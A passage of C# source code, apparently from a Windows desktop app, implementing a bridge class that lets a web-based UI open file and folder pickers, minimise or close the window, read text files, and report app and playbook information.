        if (bytes < 1024 * 1024) return $"{bytes / 1024.0:F1} KB";
        return $"{bytes / (1024.0 * 1024):F2} MB";
    }

    private static string FormatHexPreview(byte[] data, int maxBytes)
    {
        var sb = new StringBuilder();
        int count = Math.Min(data.Length, maxBytes);
        for (int i = 0; i < count; i += 16)
        {
            sb.AppendFormat("{0:x8}  ", i);
            int lineEnd = Math.Min(i + 16, count);
            for (int j = i; j < lineEnd; j++) sb.AppendFormat("{0:x2} ", data[j]);
            sb.AppendLine();
        }
        return sb.ToString();
    }

    private async Task<object?> Method_BrowseFile(JsonElement args)
    {
        if (_host == null) return new { ok = false, message = "no host window" };

        // Optional filter list: { filters: [{ name: "Binary", patterns: [".bin", ".exe"] }] }
        var patterns = new List<string>();
        if (args.ValueKind == JsonValueKind.Object && args.TryGetProperty("filters", out var fEl)
            && fEl.ValueKind == JsonValueKind.Array)
        {
            foreach (var f in fEl.EnumerateArray())
            {
                if (f.TryGetProperty("patterns", out var pEl) && pEl.ValueKind == JsonValueKind.Array)
                    foreach (var p in pEl.EnumerateArray())
                    {
                        var s = p.GetString();
                        if (!string.IsNullOrEmpty(s)) patterns.Add(s);
                    }
            }
        }
        if (patterns.Count == 0) patterns.Add("*");

        // Marshal to UI thread; file picker requires it.
        var tcs = new TaskCompletionSource<string?>();
        bool enqueued = _ui.TryEnqueue(async () =>
        {
            try
            {
                var picker = new FileOpenPicker
                {
                    ViewMode = PickerViewMode.List,
                    SuggestedStartLocation = PickerLocationId.Desktop,
                };
                foreach (var p in patterns) picker.FileTypeFilter.Add(p);

                InitializeWithWindow.Initialize(picker, _host.Hwnd);
                var file = await picker.PickSingleFileAsync();
                tcs.SetResult(file?.Path);
            }
            catch (Exception ex)
            {
                tcs.SetException(ex);
            }
        });

        if (!enqueued)
            return new { ok = false, message = "The file picker could not be opened." };

        var path = await tcs.Task;
        if (string.IsNullOrEmpty(path)) return new { ok = false, cancelled = true };
        return new { ok = true, path };
    }

    private async Task<object?> Method_BrowseFolder(JsonElement args)
    {
        if (_host == null) return new { ok = false, message = "no host window" };

        var tcs = new TaskCompletionSource<string?>();
        bool enqueued = _ui.TryEnqueue(async () =>
        {
            try
            {
                var picker = new FolderPicker { SuggestedStartLocation = PickerLocationId.Desktop };
                picker.FileTypeFilter.Add("*");
                InitializeWithWindow.Initialize(picker, _host.Hwnd);
                var folder = await picker.PickSingleFolderAsync();
                tcs.SetResult(folder?.Path);
            }
            catch (Exception ex) { tcs.SetException(ex); }
        });

        if (!enqueued)
            return new { ok = false, message = "The folder picker could not be opened." };

        var path = await tcs.Task;
        if (string.IsNullOrEmpty(path)) return new { ok = false, cancelled = true };
        return new { ok = true, path };
    }

    private Task<object?> Method_WindowMinimize(JsonElement _)
    {
        _ui.TryEnqueue(() => _host?.MinimizeFromBridge());
        return Task.FromResult<object?>(new { ok = true });
    }

    private Task<object?> Method_WindowMaximize(JsonElement _)
    {
        _ui.TryEnqueue(() => _host?.MaximizeFromBridge());
        return Task.FromResult<object?>(new { ok = true });
    }

    private Task<object?> Method_WindowClose(JsonElement _)
    {
        _ui.TryEnqueue(() => _host?.CloseFromBridge());
        return Task.FromResult<object?>(new { ok = true });
    }

    private async Task<object?> Method_ReadText(JsonElement args)
    {
        if (!args.TryGetProperty("path", out var pEl)) throw new ArgumentException("path required");
        var path = pEl.GetString() ?? "";
        if (string.IsNullOrEmpty(path) || !File.Exists(path))
            return new { ok = false, message = "path not found" };
        var text = await File.ReadAllTextAsync(path);
        return new { ok = true, path, text };
    }

    private Task<object?> Method_AppInfo(JsonElement _)
    {
        string version = typeof(WebShellBridge).Assembly.GetName().Version?.ToString(3) ?? "1.0.0";
        return Task.FromResult<object?>(new
        {
            version,
            cliAvailable = _cli.IsAvailable,
            cliPath = _cli.CliPath,
            assetsDirectory = _paths.AssetsDirectory,
            executableDirectory = _paths.ExecutableDirectory,
            playbookPath = _paths.ActivePlaybookPath,
        });
    }

    private Task<object?> Method_ListPlaybooks(JsonElement _)
    {
        var list = _paths.GetAvailablePlaybookFiles() ?? Array.Empty<string>();
        return Task.FromResult<object?>(new
        {
            active = _paths.ActivePlaybookFullPath,
            files = list,
        });
    }
}
